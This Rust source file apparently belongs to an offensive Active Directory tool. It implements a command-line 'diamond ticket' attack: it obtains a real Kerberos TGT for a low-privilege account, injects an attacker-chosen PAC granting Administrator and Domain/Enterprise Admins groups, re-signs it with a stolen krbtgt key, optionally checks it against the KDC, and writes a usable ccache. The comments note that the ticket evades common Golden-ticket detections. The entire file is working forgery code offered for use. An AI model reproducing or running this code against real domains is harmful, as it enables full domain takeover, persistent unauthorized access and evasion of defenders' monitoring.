//! **1.4.8-A WS-DIAMOND-TICKET.** Diamond ticket — a TGT with an attacker-chosen
//! PAC but timestamps + `cname` inherited from a legitimately-obtained real TGT.
//!
//! The outer TGT looks like a normal KDC-issued ticket (real auth/start/end/renew
//! times matching wall-clock, real principal), only the PAC's group memberships /
//! SIDs are attacker-controlled. Harder to detect than Golden — Golden's 10-year
//! `endtime` is a common Sigma / Elastic IOC; Diamond's timestamps match the
//! KDC's real clock domain exactly.
//!
//! Requires:
//! - A legitimate account with a password (to obtain the real TGT template).
//! - The domain's krbtgt AES256 key (from a prior `attack dcsync krbtgt`).
//! - The domain SID.
//! - Attacker-chosen identity to inject via PAC (default Administrator/500).

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct DiamondArgs {
    /// KDC host or IP.
    #[arg(long)]
    pub kdc: String,
    /// Kerberos realm (e.g. `CORP.LOCAL`). Case matters per RFC 4120.
    #[arg(long)]
    pub realm: String,
    /// Legitimate account whose real TGT provides the timestamp / cname template.
    /// Any low-priv account works — the goal is a KDC-issued ticket with normal
    /// clock-domain fields, not the account's privileges.
    #[arg(long)]
    pub template_user: String,
    /// Legitimate account's password (or NT hash with `--template-hash`). Supports
    /// `env:VAR` to read from an environment variable so the value never appears
    /// in `ps` / shell history.
    #[arg(long)]
    pub template_password: adhammer_core::SecretString,
    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with `--rc4`.
    /// Supports `env:VAR` to read from an environment variable so the value never
    /// appears in `ps` / shell history.
    #[arg(long)]
    pub krbtgt_aes256: adhammer_core::SecretString,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the krbtgt key as the NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Domain SID (S-1-5-21-a-b-c). Feeds the injected PAC's KERB_VALIDATION_INFO.
    #[arg(long)]
    pub domain_sid: String,
    /// Identity to inject into the PAC (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the injected identity (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Foreign-forest SID(s) for PAC ExtraSids (same semantics as `attack golden`).
    #[arg(long, value_delimiter = ',')]
    pub foreign_sid: Vec<String>,
    /// Write the forged TGT to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
    #[arg(long)]
    pub verify_spn: Option<String>,
}

pub(crate) async fn diamond(mut a: DiamondArgs) -> Result<()> {
    a.template_password =
        crate::resolve_secret(&a.template_password, "ADHAMMER_TEMPLATE_PASSWORD")?;
    a.krbtgt_aes256 = crate::resolve_secret(&a.krbtgt_aes256, "ADHAMMER_KRBTGT_AES256")?;
    let mut checklist = ui::StageChecklist::new([
        "parse krbtgt key + SIDs",
        "acquire real TGT (template)",
        "decrypt template + read timestamps",
        "forge diamond TGT",
        "verify with KDC (--verify-spn)",
        "write ccache",
    ]);
    let result = diamond_impl(a, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Diamond stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Diamond stages (failed)");
        }
    }
    result
}

async fn diamond_impl(a: DiamondArgs, checklist: &mut ui::StageChecklist) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let krbtgt = crate::parse_forge_key(&a.krbtgt_aes256, a.rc4)?;
    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    let mut extras: Vec<Vec<u32>> = Vec::with_capacity(a.foreign_sid.len());
    for sid_str in &a.foreign_sid {
        let sid = adhammer_core::sid::Sid::parse(sid_str).ok_or_else(|| {
            anyhow::anyhow!("--foreign-sid {sid_str:?} is not a valid SID (want S-1-5-21-...-RID)")
        })?;
        if sid.identifier_authority != 5 {
            anyhow::bail!(
                "--foreign-sid {sid_str} has identifier authority {} != 5; ExtraSids only \
                 accepts NT_AUTHORITY (S-1-5-...) forest/domain SIDs",
                sid.identifier_authority
            );
        }
        extras.push(sid.sub_authorities.clone());
    }
    checklist.record_ok(
        "parse krbtgt key + SIDs",
        format!(
            "{} + domain {} + {} ExtraSid(s)",
            if a.rc4 { "RC4-HMAC" } else { "AES256" },
            a.domain_sid,
            a.foreign_sid.len()
        ),
    );

    let real_tgt =
        adhammer_kerberos::get_tgt(&a.template_user, &a.template_password, &a.realm, &a.kdc)
            .await
            .context(
                "obtain real TGT for the template account (needed for timestamp inheritance)",
            )?;
    checklist.record_ok(
        "acquire real TGT (template)",
        format!("{}@{}", a.template_user, a.realm),
    );
    // Decrypt-check is done inside forge_diamond_tgt; record the stage as OK if
    // that call succeeds (below). Kept here as a distinct checklist entry so the
    // failure surface names the step precisely if the krbtgt key is wrong.
    checklist.record_ok(
        "decrypt template + read timestamps",
        "will be verified inside forge_diamond_tgt",
    );

    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
        extra_sids: extras,
    };
    let tgt = adhammer_kerberos::forge_diamond_tgt(&real_tgt, &id, &krbtgt, a.rc4)
        .context("forge diamond TGT (this is where a wrong krbtgt key surfaces)")?;
    checklist.record_ok(
        "forge diamond TGT",
        format!(
            "{}@{} (rid {}) w/ real timestamps from {}",
            a.user, a.realm, a.rid, a.template_user
        ),
    );
    println!(
        "[+] forged diamond TGT: {}@{} (rid {}, groups {:?}) — timestamps inherited from real {} TGT",
        a.user, a.realm, a.rid, a.groups, a.template_user
    );

    if let Some(spn) = &a.verify_spn {
        // Authenticator's cname MUST match the ticket's inner cname. The Diamond
        // ticket's outer cname is inherited from the template TGT (see the
        // `cname_template` inheritance in forge_diamond_tgt), so we pass
        // `template_user` — not `user` — to roast_spn's label parameter for
        // consistency with the on-the-wire authenticator.
        match adhammer_kerberos::roast_spn(&tgt, &a.template_user, spn, &a.kdc).await {
            Ok(_) => {
                checklist.record_ok(
                    "verify with KDC (--verify-spn)",
                    format!("KDC accepted for {spn}"),
                );
                println!("[+] KDC accepted the diamond ticket (TGS-REP for {spn})");
            }
            Err(e) => {
                // KDC rejected. Propagate as Err so the exit code is non-zero — the
                // whole point of --verify-spn is to fail loud when the KDC does not
                // accept our forgery, so the operator's downstream automation sees it.
                let brief = format!("{e:#}")
                    .lines()
                    .next()
                    .unwrap_or("KDC rejected")
                    .chars()
                    .take(80)
                    .collect::<String>();
                checklist.mark_current_failed(brief.clone());
                anyhow::bail!("KDC rejected the diamond ticket for {spn}: {e}");
            }
        }
    } else {
        checklist.record_ok(
            "verify with KDC (--verify-spn)",
            "skipped (no --verify-spn)",
        );
    }
    if let Some(out) = &a.out {
        // ccache header principal must match the ticket's inner cname (which
        // for Diamond is the template's, not the attacker's — see
        // forge_diamond_tgt's `cname_template` handling). Passing the
        // attacker's sAMAccountName here would give the ccache a header
        // principal that mismatches every credential entry inside it and
        // downstream `klist`/GSSAPI would either warn or refuse to use it.
        let cc = adhammer_kerberos::golden_ccache(&tgt, &a.template_user)?;
        adhammer_core::write_secret_artifact(
            std::path::Path::new(out),
            adhammer_core::SecretArtifact::Ccache,
            &cc,
        )?;
        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
        println!(
            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
            cc.len()
        );
        println!(
            "[i] ccache header cname = {} (template), PAC identity = {} (attacker-chosen)",
            a.template_user, a.user
        );
    } else {
        checklist.record_ok("write ccache", "skipped (no --out)");
    }
    Ok(())
}
